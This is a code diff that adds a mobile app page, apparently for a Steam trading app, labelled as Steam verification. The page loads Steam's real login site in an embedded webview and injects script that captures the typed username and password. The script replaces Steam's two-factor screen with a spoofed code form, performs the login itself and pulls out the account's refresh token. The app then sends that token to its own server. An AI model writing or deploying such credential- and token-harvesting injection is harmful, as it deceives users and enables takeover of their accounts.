@@ -1,0 +1,411 @@
+<template>
+	<view>
+		<u-navbar :title="i18n.t('app.steam.verification')" leftIconColor="#fff" :titleStyle="{color:'#fff'}"
+			bgColor="#171a21" :autoBack="true"></u-navbar>
+
+	</view>
+</template>
+
+<script>
+	import i18n from '@/utils/locales/i18n';
+	import {
+		getAppUserInfo,
+	} from '@/utils/storage/modules/user.js';
+	import {
+		steamTokenFreshApi
+	} from '@/api/modules/steam.js';
+
+	export default {
+		data() {
+			return {
+				i18n: i18n,
+				getUserSteamWeb: null,
+			}
+		},
+		onBackPress(options) {
+			if (this.getUserSteamWeb && options.from == 'navigateBack') {
+				this.close();
+			}
+		},
+		mounted() {
+			this.createUserSteamWeb();
+		},
+		methods: {
+			/**
+			 * 获取账号密码
+			 */
+			createUserSteamWeb() {
+				const page = this.$scope.$getAppWebview();
+				this.getUserSteamWeb = plus.webview.create("", "WKWebview", {
+					plusrequire: "none",
+					kernel: 'WKWebview',
+					'uni-app': 'none',
+					top: this.getSystemInfo().statusBarHeight + 44 + "px",
+					height: this.getSystemInfo().windowHeight + "px",
+					progress: {
+						color: '#74bcff'
+					}
+				})
+				this.getUserSteamWeb.loadURL('https://steamcommunity.com/login/home/?l=english');
+				let i = 0;
+				try {
+					this.getUserSteamWeb.addEventListener('loaded', (e) => {
+						this.getUserSteamWeb.evalJS(`
+							window.onload = function() {
+								// 存储所有定时器ID
+								const timers = new Map(); // 使用Map避免ID重复问题
+								
+								// 保存原始方法
+								const originalSetTimeout = window.setTimeout;
+								const originalSetInterval = window.setInterval;
+								
+								// 重写setTimeout
+								window.setTimeout = function(callback, delay, ...args) {
+								  const timerId = originalSetTimeout.call(this, callback, delay, ...args);
+								  timers.set(timerId, { type: 'timeout', id: timerId });
+								  return timerId;
+								};
+								
+								// 重写setInterval
+								window.setInterval = function(callback, delay, ...args) {
+								  const timerId = originalSetInterval.call(this, callback, delay, ...args);
+								  timers.set(timerId, { type: 'interval', id: timerId });
+								  return timerId;
+								};
+								
+								// 获取所有定时器
+								function getAllTimers() {
+								  return Array.from(timers.values());
+								}
+								
+								// 清除所有定时器
+								function clearAllTimers() {
+								  getAllTimers().forEach(({ id, type }) => {
+								    type === 'timeout' ? clearTimeout(id) : null;
+								    timers.delete(id);
+								  });
+								}
+								var login_dom = null;
+								var login_timer = null;
+								login_timer = setInterval(() => {
+									login_dom = document.getElementsByClassName('DjSvCZoKKfoNSmarsEcTS');
+									if (login_dom && login_dom[0]&&login_dom[0].innerHTML&&login_dom[0].innerHTML == 'Sign in') {
+										clearInterval(login_timer);
+										login_timer = null;
+							
+										var form_dom = document.getElementsByClassName('_2GBWeup5cttgbTw8FM3tfx');
+										var form_acccount = form_dom[0].value;
+										var form_password = form_dom[1].value;
+										form_dom[0].addEventListener('input', (e) => {
+											form_acccount = e.target.value;
+										})
+										form_dom[1].addEventListener('input', (e) => {
+											form_password = e.target.value;
+										})
+										
+										var RSARes = {};
+										var beginAuthRes = {};
+										login_dom[0].addEventListener('click', () => {
+											var confirm_dom = null;
+											var confirm_timer = null;
+											
+											confirm_timer = setInterval(() => {
+												confirm_dom = document.getElementsByClassName('_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx');
+												if (confirm_dom && confirm_dom[0]&&confirm_dom[0].innerHTML&&confirm_dom[0].innerHTML == 'Enter a code instead') {
+													clearInterval(confirm_timer)
+													confirm_timer = null;
+													
+													
+													var nodeDom = document.getElementsByClassName('_3XCnc4SuTz8V8-jXVwkt_s')[0];
+													nodeDom.innerHTML = '';
+													var formElement = document.createElement('form');
+													
+													// 创建主容器 div
+													var container = document.createElement('div');
+													container.className = '_1NOsG2PAO2rRBb8glCFM_6 _2QHQ1DkwVuPafY7Yr1Df6w';
+													container.style.gap = '14px';
+													
+													// 创建账户信息区域
+													var accountElement = document.createElement('div');
+													accountElement.className = '_3JBYGcszFcaSNXHHSR3kCV';
+													
+													// 账户文本
+													var accountText = document.createElement('div');
+													accountText.className = '_1hKgiFuFaVR_Sq1Gj_gCnd';
+													
+													// 创建账户号码span
+													var accountSpan = document.createElement('span');
+													accountSpan.className = '_31Vq4lzNWs4WikXVr9J4hz';
+													accountSpan.textContent = form_acccount;
+													
+													// 组装账户文本
+													accountText.appendChild(document.createTextNode('Account: '));
+													accountText.appendChild(accountSpan);
+													
+													
+													var authText = document.createElement('div');
+													authText.className = '_2o5mE8JpPFOyJ0HwX_y0y7';
+													authText.textContent = 'You have a mobile authenticator protecting this account.';
+													
+													accountElement.appendChild(accountText);
+													accountElement.appendChild(authText);
+													
+													
+													// 创建验证码输入区域
+													var codeElement = document.createElement('div');
+													codeElement.className = '_3huyZ7Eoy2bX4PbCnH3p5w';
+													
+													var inputContainer = document.createElement('div');
+													inputContainer.className = '_1NOsG2PAO2rRBb8glCFM_6 _2QHQ1DkwVuPafY7Yr1Df6w';
+													inputContainer.style.gap = '2px';
+													
+													var inputErrorWrapper = document.createElement('div');
+													inputErrorWrapper.className = '_1W_6HXiG4JJ0By1qN_0fGZ';
+													inputErrorWrapper.innerHTML = '';
+													
+													var inputWrapper = document.createElement('div');
+													inputWrapper.className = '_1gzkmmy_XA39rp9MtxJfZJ Panel Focusable';
+													
+													
+													// 创建5个输入框
+													var steamCodes = ['', '', '', '', ''];
+													const inputs = [];
+													for (let i = 0; i < 5; i++) {
+													  var input = document.createElement('input');
+													  input.type = 'text';
+													  input.maxLength = 1;
+													  input.autocomplete = 'none';
+													  input.className = '_3xcXqLVteTNHmk-gh9W65d Focusable';
+													  input.setAttribute('role', 'button');
+													  input.addEventListener('input', function(e) {
+														    // 自动跳转到下一个输入框
+														    if (e.target.value.length === 1 && i < 4) {
+														        inputs[i + 1].focus();
+														    }
+															e.target.value = e.target.value.replace(/[^a-zA-Z0-9]/g, "").toUpperCase();
+															steamCodes[i] = e.target.value;
+															if (steamCodes.every(code => code)) {
+																console.log("验证通过")
+																console.log(beginAuthRes.client_id)
+																console.log(beginAuthRes.steamid)
+																$J.ajax({
+																	type: 'POST',
+																	url: 'https://api.steampowered.com/IAuthenticationService/UpdateAuthSessionWithSteamGuardCode/v1',
+																	header: {
+																		"Content-Type": 'application/x-www-form-urlencoded; charset=UTF-8',
+																		"Referer": 'https://steamcommunity.com',
+																	},
+																	data: {
+																		"client_id": beginAuthRes.client_id,
+																		"steamid": beginAuthRes.steamid,
+																		"code_type": '3',
+																		"code": steamCodes.join(''),
+																	}
+																}).done(function(updateAuth) {
+																	console.log("=============== code ========")
+																	console.log(JSON.stringify(updateAuth))
+																	var codeRes = updateAuth.response;
+																	if (codeRes.agreement_session_url === '') {
+																		$J.ajax({
+																			type: 'POST',
+																			url: 'https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/',
+																			header: {
+																				"Content-Type": 'application/x-www-form-urlencoded; charset=UTF-8',
+																				"Referer": 'https://steamcommunity.com',
+																			},
+																			data: {
+																				"client_id": beginAuthRes.client_id,
+																				"request_id": beginAuthRes.request_id,
+																			}
+																		}).done(function(pollAuth) {
+																			var pollAuthData = pollAuth.response;
+																			if (pollAuthData.had_remote_interaction && pollAuthData.refresh_token) {
+																				document.title = pollAuthData.refresh_token;
+																			}
+																		});
+																	}
+																})
+															}
+													  })
+													   // 添加按键事件监听
+													    input.addEventListener('keydown', function(e) {
+													      // 处理退格键
+													      if (e.key === 'Backspace' && e.target.value.length === 0 && i > 0) {
+													        inputs[i - 1].focus();
+													      }
+													      
+													      // 处理左右箭头键
+													      if (e.key === 'ArrowLeft' && i > 0) {
+													        inputs[i - 1].focus();
+													        e.preventDefault();
+													      }
+													      if (e.key === 'ArrowRight' && i < 4) {
+													        inputs[i + 1].focus();
+													        e.preventDefault();
+													      }
+													    });
+													  
+													  inputs.push(input);
+													  inputWrapper.appendChild(input);
+													}
+													
+													inputContainer.appendChild(inputErrorWrapper);
+													inputContainer.appendChild(inputWrapper);
+													codeElement.appendChild(inputContainer);
+													
+													// 创建提示区域
+													var hintElement = document.createElement('div');
+													hintElement.className = '_2Io_Jc8M4cRHn9cU4vHcqW';
+													hintElement.style.display = 'flex';
+													hintElement.style.flexDirection = 'row';
+													hintElement.style.justifyContent = 'space-evenly';
+													hintElement.style.alignItems = 'center';
+													
+													var hintText = document.createElement('div');
+													hintText.className = '_1rEWOv1g1uTXNhoWiJLQZs';
+													hintText.textContent = 'Enter the code from your Steam Mobile App';
+													
+													// 创建SVG图标
+													var svgIcon = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
+													svgIcon.setAttribute('viewBox', '0 0 33 49');
+													svgIcon.setAttribute('fill', 'currentColor');
+													svgIcon.className.baseVal = '_3WvDpj9Ng6SQliygcVqlJU';
+													
+													var path1 = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+													path1.setAttribute('fill', 'currentColor');
+													path1.setAttribute('fill-rule', 'evenodd');
+													path1.setAttribute('clip-rule', 'evenodd');
+													path1.setAttribute('d', 'M28 47.1106C29.1046 47.1106 30 46.2151 30 45.1106L30 3.72705C30 2.62248 29.1046 1.72705 28 1.72705L5 1.72705C3.89544 1.72705 3 2.62248 3 3.72705L3 45.1106C3 46.2151 3.89543 47.1106 5 47.1106L28 47.1106ZM5.68119 5.82741L27.3188 5.82741L27.3188 42.7772H5.68119L5.68119 5.82741ZM20.9999 44.944C20.9999 45.3429 20.6766 45.6662 20.2777 45.6662L12.7221 45.6662C12.3233 45.6662 11.9999 45.3429 11.9999 44.944C11.9999 44.5451 12.3233 44.2218 12.7221 44.2218H20.2777C20.6766 44.2218 20.9999 44.5451 20.9999 44.944ZM17.2778 4.44406C17.6767 4.44406 18 4.12071 18 3.72184C18 3.32296 17.6767 2.99962 17.2778 2.99962L15.7222 2.99962C15.3233 2.99962 15 3.32296 15 3.72184C15 4.12071 15.3233 4.44406 15.7222 4.44406L17.2778 4.44406Z');
+													
+													var path2 = document.createElementNS('http://www.w3.org/2000/svg', 'path');
+													path2.setAttribute('fill', 'currentColor');
+													path2.setAttribute('d', 'M22.2456 22.4164C22.2456 21.6666 22.8127 21.0002 23.6228 21.0002C24.3519 21.0002 25 21.6666 25 22.4164C25 23.1661 24.3519 23.8325 23.6228 23.8325C22.8937 23.8325 22.2456 23.1661 22.2456 22.4164Z');
+													
+													// 添加更多路径元素...
+													
+													svgIcon.appendChild(path1);
+													svgIcon.appendChild(path2);
+													
+													hintElement.appendChild(hintText);
+													hintElement.appendChild(svgIcon);
+													codeElement.appendChild(hintElement);
+													
+													// 创建底部链接
+													var backupLink = document.createElement('div');
+													backupLink.className = '_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx';
+													backupLink.textContent = 'Use backup code';
+													
+													var helpLink = document.createElement('a');
+													helpLink.className = '_1K431RbY14lkaFW6-XgSsC _2FyQDUS2uHbW1fzoFK2jLx';
+													helpLink.href = 'https://help.steampowered.com/wizard/HelpWithLoginInfo?lost=8&issueid=402';
+													helpLink.textContent = 'Help, I no longer have access to my Steam Mobile App';
+													
+													// 组装所有元素
+													container.appendChild(accountElement);
+													container.appendChild(codeElement);
+													container.appendChild(backupLink);
+													container.appendChild(helpLink);
+													
+													formElement.appendChild(container);
+													
+													// 将表单添加到文档中
+													nodeDom.appendChild(formElement);
+													
+													
+													
+													// 确认
+													$J.ajax({
+														type: 'GET',
+														url: 'https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1/?account_name=' + form_acccount,
+													}).done(function(response) {
+														RSARes = response.response;
+														var pubKey = RSA.getPublicKey(RSARes.publickey_mod, RSARes.publickey_exp);
+														var encryptedPassword = RSA.encrypt(form_password, pubKey);
+														$J.ajax({
+															type: 'POST',
+															url: 'https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1/',
+															data: {
+																"persistence": 1,
+																"encrypted_password": encryptedPassword,
+																"account_name": form_acccount,
+																"encryption_timestamp": RSARes.timestamp
+															}
+														}).done(function(beginAuth) {
+															beginAuthRes = beginAuth.response;
+															console.log('302')
+															console.log(JSON.stringify(beginAuthRes))
+															var auth_timer = null;
+															auth_timer = setInterval(() => {
+																$J.ajax({
+																	type: 'POST',
+																	url: 'https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1/',
+																	header: {
+																		"Content-Type": 'application/x-www-form-urlencoded; charset=UTF-8',
+																		"Referer": 'https://steamcommunity.com',
+																	},
+																	data: {
+																		"client_id": beginAuthRes.client_id,
+																		"request_id": beginAuthRes.request_id,
+																	}
+																}).done(function(pollAuth) {
+																	var pollAuthData = pollAuth.response;
+																	if (pollAuthData.had_remote_interaction &&pollAuthData.refresh_token) {
+																		clearInterval(auth_timer)
+																		auth_timer = null;
+																		document.title = pollAuthData.refresh_token;
+																	}
+																});
+															}, 2000)
+														
+														});
+													});
+												}
+											}, 2000)
+										})
+									}
+								}, 2000)
+							}()
+						`);
+						var title_timer = null;
+
+						title_timer = setInterval(async () => {
+							if (this.getUserSteamWeb.getTitle().startsWith(
+									'eyAidHlwIjogIkpXVCIsICJhbGciOiAiRWREU0EiIH0')) {
+								clearInterval(title_timer)
+								title_timer = null;
+
+								let steamReq = {
+									steamId: getAppUserInfo().config.steamId,
+									freshToken: this.getUserSteamWeb.getTitle(),
+								}
+								const qres = await steamTokenFreshApi(steamReq);
+								if (qres.code == 0) {
+									this.close();
+									console.log("update token suessce")
+									setTimeout(() => {
+										uni.navigateBack();
+									}, 500)
+								}
+							}
+						}, 5000)
+					}, false);
+					page.append(this.getUserSteamWeb);
+				} catch (errors) {
+					console.log(errors)
+				}
+				this.getUserSteamWeb.show();
+			},
+			getSystemInfo() {
+				const systemInfo = uni.getSystemInfoSync();
+				return systemInfo;
+			},
+			close() {
+				this.getUserSteamWeb.addEventListener('loaded', (e) => {
+					this.getUserSteamWeb.evalJS('javascript:Logout();');
+				});
+				this.getUserSteamWeb.close();
+				this.getUserSteamWeb = null;
+			},
+		}
+	}
+</script>
